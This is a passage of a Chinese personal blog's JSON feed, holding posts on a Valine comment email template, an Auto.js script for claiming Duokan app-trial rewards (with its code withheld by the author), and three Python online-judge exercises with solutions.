class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend header&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;background: #1e1f27; padding: 40px 20px;&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner header-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">href</span>=<span class=\"string\">&quot;$&#123;SITE_URL&#125;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: #fff; text-decoration: none;font-size:30px;font-weight:normal&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    &gt;</span></span><br><span class=\"line\">      $&#123;SITE_NAME&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend title&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;padding: 20px 20px; background: #f9f9f9;&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner title-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;font-weight: 300; font-size: 1.4em; margin: 0.67em 0; line-height: 1.4;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    &gt;</span></span><br><span class=\"line\">      $&#123;NICK&#125; 发布了新评论</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend content&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;padding: 20px 20px;&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner content-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">strong</span>&gt;</span>$&#123;NICK&#125;<span class=\"tag\">&lt;/<span class=\"name\">strong</span>&gt;</span> 发布评论：<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend footer&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">&quot;padding: 20px 20px; background: #eee; color: #666; font-size: 90%;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    &gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">class</span>=<span class=\"string\">&quot;extend-inner footer-inner&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">style</span>=<span class=\"string\">&quot;max-width: 600px; margin: 0 auto;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">        $&#123;COMMENT&#125;</span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">href</span>=<span class=\"string\">&quot;$&#123;POST_URL&#125;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: rgb(3,120,221);border-bottom: 1.0px solid rgb(3,120,221);text-decoration: none;margin-bottom: 2.0px;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span>查看评论&lt;/a</span><br><span class=\"line\">      &gt;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div></div></div>\n",
            "tags": [
                "博客"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2020/auto-duokan/",
            "url": "https://blog.meancoder.xyz/2020/auto-duokan/",
            "title": "多看阅读自动体验 APP 领书币",
            "date_published": "2020-11-19T14:23:34.000Z",
            "content_html": "<blockquote>\n<p><strong>本文仅用于记录自己的学习过程，严禁转载。</strong><br />\n<strong>为了避免不必要的纠纷，脚本代码已去除。</strong></p>\n</blockquote>\n<p>多看阅读一直都有体验 APP 领取书豆的活动，体验 30 秒 APP\n就可以免费领取 30\n书豆。不过以前每天只能领几次，今年国庆时开始每天可以领很多次，每天大约能领\n3000 个书豆（相当于 30 块），不过这样领下来要花很久。所以我就利用<a\nhref=\"https://github.com/hyb1996/Auto.js\">Auto.js</a>写了一个自动体验\nAPP 领取书豆的脚本，昨天写完，今天试了一下感觉不错。</p>\n<p>好久没写博客了，先水一篇，同时记录一下学习过程。最近打算再认真学一下\njs，把小爱课程表的自动导入写出来。</p>\n<span id=\"more\"></span>\n<p>第一次接触到<a\nhref=\"https://github.com/hyb1996/Auto.js\">Auto.js</a>还是 18\n年双十一，当时在酷安看到有人用这个自动领喵币，后来每次这种活动我都会用。国庆的时候我就想找个脚本自动领书豆，但是可能多看用户不多吧，一直没找到，当时也想自己写一个，但是又感觉比较复杂，就没有管。最近想买书了，就想着自己试着写一下。</p>\n<p>一开始我是直接写 js\n文件，然后传到手机上运行。后来觉得很麻烦，就看了看文档，找到了 VS Code\n插件，可以远程运行，方便了很多。</p>\n<p>本来这些体验 APP 我都没有同意用户协议，不想给权限，但是这样导致打开\nAPP 时会弹出用户协议，不能直接返回退出，甚至有些 APP\n不能点击退出。所以我就想把这些应用分下类，不同类 APP 进行不同操作。但是\nAPP 非常多，而且退出操作五花八门。索性我就同意了用户协议，不再给 APP\n分类，都可以通过返回退出。</p>\n<p>另外一个问题是多看的任务页面有很多任务，都有领取按钮，我用<code>findOne()</code>或者<code>findOnce()</code>会导致执行一次任务后找到的领取按钮是下一个任务。我就想找到所有任务，然后根据和任务名的相对位置找到按钮，可是执行一次后会找不到体验\nAPP\n任务的按钮（我也不知道怎么回事）。最后只好通过模拟点击来实现，不过这样在其他设备上用时可能要改动点击坐标。</p>\n",
            "tags": [
                "杂",
                "JavaScript",
                "Node.js"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2020/add-email-notice/",
            "url": "https://blog.meancoder.xyz/2020/add-email-notice/",
            "title": "Valine 添加邮件提醒",
            "date_published": "2020-08-26T10:24:00.000Z",
            "content_html": "<div class=\"note warning\"><h4 id=\"注意\">注意</h4>\n<p>本站评论系统已迁移到<a href=\"https://twikoo.js.org/\">Twikoo</a>，<a\nhref=\"./2022/change-domain-and-comment/\">查看详情</a>。</p>\n</div>\n<p>我的博客一直用的是<a\nhref=\"https://valine.js.org/\">Valine</a>，这也是我最喜欢的评论系统，简洁高效。但是美中不足的是邮件提醒功能将在\nv1.4.0 时下线了，不过官网也给出了替代方法：<a\nhref=\"https://github.com/zhaojun1998/Valine-Admin\">Valine-Admin</a>。我在<a\nhref=\"https://www.antmoe.com/posts/2380732b/index.html\">小康</a>的基础上修改了一下，改了一下邮件模板，去掉了几个我用不上的参数，而且由于评论都是以\nHTML 形式保存的，而<a href=\"http://sc.ftqq.com/3.version\">Server\n酱</a>暂时不兼容 HTML，所以我加入了另一个微信推送服务<a\nhref=\"http://pushplus.hxtrip.com/index\">pushplus(推送加)微信推送消息直达</a>。</p>\n<span id=\"more\"></span>\n<p>安装过程就不多说了，今天还特地注册了国际版的\nLeanCloud（因为没备案），按照教程还是很简单的，发送邮件的账号刚好用上了我用这个域名注册的企业邮箱。</p>\n<p>Valine-Admin 实现了收到消息后即时通过邮件提醒用户，并利用\npush+提醒博主。对于没有后端的 Valine\n来说，这个功能是非常实用的。还有后台管理，可以直接查看和管理评论，非常方便（然而并没有人给我留言）。</p>\n<p>当然，对于白嫖用户，LeanCloud\n还是有一定限制的，免费的云引擎会自动休眠，而且每天强制休眠 6\n小时，自带的定时唤醒也被官方限制了，不过现在用 Github Actions\n可以定时唤醒。而且用云函数实现了定时重发，应该不会漏消息了。</p>\n<p>这个版本是我自己用的，以后完善一下可能会公开。</p>\n",
            "tags": [
                "博客"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2020/OJ-3-Python-problems/",
            "url": "https://blog.meancoder.xyz/2020/OJ-3-Python-problems/",
            "title": "OJ 上的三道 Python 题",
            "date_published": "2020-07-15T10:05:12.000Z",
            "content_html": "<p>昨天在 OJ 上做了 19 级理科大计基的 12\n道题，有两个始终过不去，今天写了最后一道，过了。</p>\n<p>把这三道题分享一下。</p>\n<span id=\"more\"></span>\n<h2 id=\"超市收银系统\">超市收银系统</h2>\n<p>这题一直报<em>WA</em></p>\n<p>时间限制: 1000 ms 内存限制: 65536 kb</p>\n<h3 id=\"题目\">题目</h3>\n<h4 id=\"题目描述\">题目描述</h4>\n<p><strong>本题描述有更改，清注意</strong></p>\n<p>一般超市或商店的收银台在对商品扫码之后会得到一串数字，这串数字代表一种商品。假设已知所有商品的名称、代码和单价，现在需要你写一个程序，输入扫码得到的商品代码（假设固定为\n6\n位数字），计算所购买的每种商品的数量（件数）、总价，并按照字典序打印商品的小票（如果某种商品购买了多件，应在同一行内输出该商品的<strong>名称</strong>、<strong>数量</strong>、<strong>单价</strong>和<strong>总价</strong>）。计算所购买所有商品的总金额，并打印。\n给出商品目录如下：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">格式：名称 代码 单价</span><br><span class=\"line\">chips 932071 3.50</span><br><span class=\"line\">chocolate 114049 8.00</span><br><span class=\"line\">soap 304985 2.90</span><br><span class=\"line\">cupcake 955962 4.90</span><br><span class=\"line\">cookie 313903 6.50</span><br><span class=\"line\">milk 243813 3.20</span><br><span class=\"line\">toothbrush 961995 4.80</span><br><span class=\"line\">toothpaste 933328 9.30</span><br><span class=\"line\">teapot 914500 29.80</span><br></pre></td></tr></table></figure>\n<h4 id=\"输入\">输入</h4>\n<p>每行为一个 6\n位数字，代表所购买的商品代码。当所有购买商品输入完毕时，以输入 0\n为结束输入标志。（毕竟你不可能跟收银员说我买了 n 件商品嘛）。</p>\n<h4 id=\"输出\">输出</h4>\n<p>一张小票，要求：\n第一行包含“NAME”、“QUANTITY”、“PRICE”、“SUM”（代表商品的名称、数量、单价和总价），各单词之间用若干空格分隔。</p>\n<p>接下来若干行，每行对应所购买的某种商品的明细。要求每列按照该项目内容字符数量最多的那一项填充空格补齐(第一行也要补齐)，要求每列左对齐，对齐之后项目之间还要空一格。</p>\n<p><strong>总价输出保留两位小数，其余数字按照 Python\n默认输出。</strong></p>\n<p><strong>按照商品名称的字典序输出。提示：可使用\nlist.sort()</strong></p>\n<p>最后一行是所购买所有商品的总金额，格式为：total:xxx.xx（注意：这里是西文的冒号，保留小数点后\n2 位）</p>\n<h4 id=\"输入样例\">输入样例</h4>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">932071</span><br><span class=\"line\">114049</span><br><span class=\"line\">932071</span><br><span class=\"line\">932071</span><br><span class=\"line\">114049</span><br><span class=\"line\">114049</span><br><span class=\"line\">932071</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出样例\">输出样例</h4>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NAME      QUANTITY PRICE SUM</span><br><span class=\"line\">chips     4        3.5   14.00</span><br><span class=\"line\">chocolate 3        8.0   24.00</span><br><span class=\"line\">total:38.00</span><br></pre></td></tr></table></figure>\n<h3 id=\"解答\">解答</h3>\n<p>由于商品信息已经给出，所以就直接手动排好序存在<code>list</code>里。</p>\n<p>扫描商品时录入的是代码，为了方便查询，这里使用了<code>dict</code>，以商品代码作为<code>key</code>，在<code>list</code>中的索引为<code>value</code>，便于直接查找。每扫描一个就增加对应商品的数量。</p>\n<p>最后输出时需要对齐，而商品不确定，所以需要先找到最长的商品名，然后对齐输出。</p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 商品信息：商品名，单价，数量</span></span><br><span class=\"line\"><span class=\"built_in\">list</span> = [[<span class=\"string\">&quot;chips&quot;</span>, <span class=\"number\">3.50</span>, <span class=\"number\">0</span>], [<span class=\"string\">&quot;chocolate&quot;</span>, <span class=\"number\">8.00</span>, <span class=\"number\">0</span>], [<span class=\"string\">&quot;cookie&quot;</span>, <span class=\"number\">6.50</span>, <span class=\"number\">0</span>], [<span class=\"string\">&quot;cupcake&quot;</span>, <span class=\"number\">4.90</span>, <span class=\"number\">0</span>], [</span><br><span class=\"line\">    <span class=\"string\">&quot;milk&quot;</span>, <span class=\"number\">3.20</span>, <span class=\"number\">0</span>], [<span class=\"string\">&quot;soap&quot;</span>, <span class=\"number\">2.90</span>, <span class=\"number\">0</span>], [<span class=\"string\">&quot;teapot&quot;</span>, <span class=\"number\">29.80</span>, <span class=\"number\">0</span>], [<span class=\"string\">&quot;toothbrush&quot;</span>, <span class=\"number\">4.80</span>, <span class=\"number\">0</span>], [<span class=\"string\">&quot;toothpaste&quot;</span>, <span class=\"number\">9.30</span>, <span class=\"number\">0</span>]]</span><br><span class=\"line\"><span class=\"comment\"># 商品代码及对应序号</span></span><br><span class=\"line\">dic = &#123;<span class=\"string\">&quot;932071&quot;</span>: <span class=\"number\">0</span>, <span class=\"string\">&quot;114049&quot;</span>: <span class=\"number\">1</span>, <span class=\"string\">&quot;313903&quot;</span>: <span class=\"number\">2</span>, <span class=\"string\">&quot;955962&quot;</span>: <span class=\"number\">3</span>,</span><br><span class=\"line\">       <span class=\"string\">&quot;243813&quot;</span>: <span class=\"number\">4</span>, <span class=\"string\">&quot;304985&quot;</span>: <span class=\"number\">5</span>, <span class=\"string\">&quot;914500&quot;</span>: <span class=\"number\">6</span>, <span class=\"string\">&quot;961995&quot;</span>: <span class=\"number\">7</span>, <span class=\"string\">&quot;933328&quot;</span>: <span class=\"number\">8</span>&#125;</span><br><span class=\"line\"><span class=\"comment\"># 第一列长度的最大值</span></span><br><span class=\"line\">maxlen = <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    x = <span class=\"built_in\">input</span>()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == <span class=\"string\">&quot;0&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"comment\">## 商品数量加1</span></span><br><span class=\"line\">    <span class=\"built_in\">list</span>[dic[x]][<span class=\"number\">2</span>] += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(<span class=\"built_in\">list</span>[dic[x]][<span class=\"number\">0</span>]) &gt; maxlen):</span><br><span class=\"line\">        maxlen = <span class=\"built_in\">len</span>(<span class=\"built_in\">list</span>[dic[x]][<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"comment\"># 第一列与第二列间有空格</span></span><br><span class=\"line\">maxlen += <span class=\"number\">1</span></span><br><span class=\"line\">total = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"comment\"># 第一列</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;NAME&quot;</span>+<span class=\"string\">&quot; &quot;</span>*(maxlen-<span class=\"number\">4</span>)+<span class=\"string\">&quot;QUANTITY PRICE SUM&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">list</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 输出数量不为0的商品</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i[<span class=\"number\">2</span>] != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">sum</span> = i[<span class=\"number\">2</span>]*i[<span class=\"number\">1</span>]</span><br><span class=\"line\">        total += <span class=\"built_in\">sum</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i[<span class=\"number\">0</span>]+<span class=\"string\">&quot; &quot;</span>*(maxlen-<span class=\"built_in\">len</span>(i[<span class=\"number\">0</span>]))+<span class=\"string\">&quot;%-9d%-6.1f%.2f&quot;</span> % (i[<span class=\"number\">2</span>], i[<span class=\"number\">1</span>], <span class=\"built_in\">sum</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;total:%.2f&quot;</span> % total)</span><br></pre></td></tr></table></figure>\n<p>输出和样例一样，却一直报<em>WA</em>，也看不到题解，不知道为啥。</p>\n<h2 id=\"代码对齐\">代码对齐</h2>\n<p>这题一直报<em>PE</em></p>\n<p>时间限制: 1000 ms 内存限制: 65536 kb</p>\n<h3 id=\"题目-1\">题目</h3>\n<h4 id=\"题目描述-1\">题目描述</h4>\n<p>Python\n代码要求严格对齐才能执行。但是对齐问题往往很难发现，有时候只是某一行少了或者多了一个空格，就会报错。现在请你编写一个\nPython 程序来帮你整理一下代码，解决少空格或多空格的问题。</p>\n<p>要求：</p>\n<p>（1）把所有的 tab(<code>'\\t'</code>)换成 4 个空格。</p>\n<p>（2）使每一行前的空格数必须是 4\n的倍数。把空格补充成不小于自身的最小的 4 的倍数。如，3 个空格补成 4\n个，5 个空格补成 8 个。</p>\n<p><strong>注意：这样的要求并不能保证输出代码一定是语法正确的。</strong></p>\n<p>（3）确保“#”与注释文字间至少有一个空格。只需要处理每行的第一个“#”即可，将后面的“#”看做注释中的文字。</p>\n<h4 id=\"输入-1\">输入</h4>\n<p>第一行是一个正整数 n，代表代码的行数。</p>\n<p>接下来 n 行，是需要整理的代码。</p>\n<h4 id=\"输出-1\">输出</h4>\n<p>整理后的代码。</p>\n<h4 id=\"输入样例-1\">输入样例</h4>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"comment\">#terrible code</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">   <span class=\"keyword\">if</span> i % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">       <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;%d is an even number\\n&#x27;</span>%i)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> i % <span class=\"number\">3</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">     <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;%d can be divided by 3\\n&#x27;</span>%i)</span><br><span class=\"line\"><span class=\"comment\">#tell people it&#x27;s over</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;It\\&#x27;s over&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出样例-1\">输出样例</h4>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># terrible code</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;%d is an even number\\n&#x27;</span>%i)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i % <span class=\"number\">3</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;%d can be divided by 3\\n&#x27;</span>%i)</span><br><span class=\"line\"><span class=\"comment\"># tell people it&#x27;s over</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;It\\&#x27;s over&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"解答-1\">解答</h3>\n<p>先处理<code>tab</code>，利用<code>str.expandtabs()</code>函数将所有<code>tab</code>替换为\n4 个空格。</p>\n<p>然后补全空格，先算出行首空格数，然后用<code>str.lstrip()</code>去掉空格再添加空格。</p>\n<p>最后补全<code>#</code>后的空格，遍历搜索。</p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\">n = <span class=\"built_in\">int</span>(<span class=\"built_in\">input</span>())</span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">    line = <span class=\"built_in\">input</span>()</span><br><span class=\"line\">    length = <span class=\"built_in\">len</span>(line)</span><br><span class=\"line\">    <span class=\"comment\"># 替换tab后去掉开头空格</span></span><br><span class=\"line\">    line = line.expandtabs(<span class=\"number\">4</span>).lstrip()</span><br><span class=\"line\">    <span class=\"comment\"># 补全空格</span></span><br><span class=\"line\">    line = <span class=\"string\">&quot; &quot;</span>*math.ceil((length-<span class=\"built_in\">len</span>(line))/<span class=\"number\">4</span>)*<span class=\"number\">4</span>+line</span><br><span class=\"line\">    lis = <span class=\"built_in\">list</span>(line)</span><br><span class=\"line\">    <span class=\"comment\"># 补上第一个#后的空格</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(lis)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(lis[i] == <span class=\"string\">&#x27;#&#x27;</span> <span class=\"keyword\">and</span> i+<span class=\"number\">1</span> &lt; <span class=\"built_in\">len</span>(lis) <span class=\"keyword\">and</span> lis[i+<span class=\"number\">1</span>] != <span class=\"string\">&#x27; &#x27;</span>):</span><br><span class=\"line\">            lis.insert(i+<span class=\"number\">1</span>, <span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;&quot;</span>.join(lis))</span><br></pre></td></tr></table></figure>\n<p>输出和样例一样，一直报<em>PE</em>。</p>\n<h2 id=\"转圈圈\">转圈圈</h2>\n<p>这题总算过了</p>\n<p>时间限制: 1000 ms 内存限制: 65536 kb</p>\n<h3 id=\"题目-2\">题目</h3>\n<h4 id=\"题目描述-2\">题目描述</h4>\n<p>情人节到了（其实是过去了），偷偷送大家一道题。</p>\n<p>本题要求你输出一个尺寸为 d×d 的数阵，数字的排列方式是从 1 到 n\n循环且顺时针转圈，看样例输出。</p>\n<h4 id=\"输入-2\">输入</h4>\n<p>两行，第一行是正整数 n(n&lt;10)，第二行是正整数 d(d&lt;20)</p>\n<h4 id=\"输出-2\">输出</h4>\n<p>转圈圈的数阵</p>\n<h4 id=\"输入样例-1-1\">输入样例 1</h4>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6</span><br><span class=\"line\">4</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出样例-1-1\">输出样例 1</h4>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 2 3 4</span><br><span class=\"line\">6 1 2 5</span><br><span class=\"line\">5 4 3 6</span><br><span class=\"line\">4 3 2 1</span><br></pre></td></tr></table></figure>\n<h4 id=\"输入样例-2\">输入样例 2</h4>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5</span><br><span class=\"line\">5</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出样例-2\">输出样例 2</h4>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 2 3 4 5</span><br><span class=\"line\">1 2 3 4 1</span><br><span class=\"line\">5 4 5 5 2</span><br><span class=\"line\">4 3 2 1 3</span><br><span class=\"line\">3 2 1 5 4</span><br></pre></td></tr></table></figure>\n<h3 id=\"解答-2\">解答</h3>\n<p>想法比较简单，设置一个变量用于控制填充方向，到达拐点后改变方向。</p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 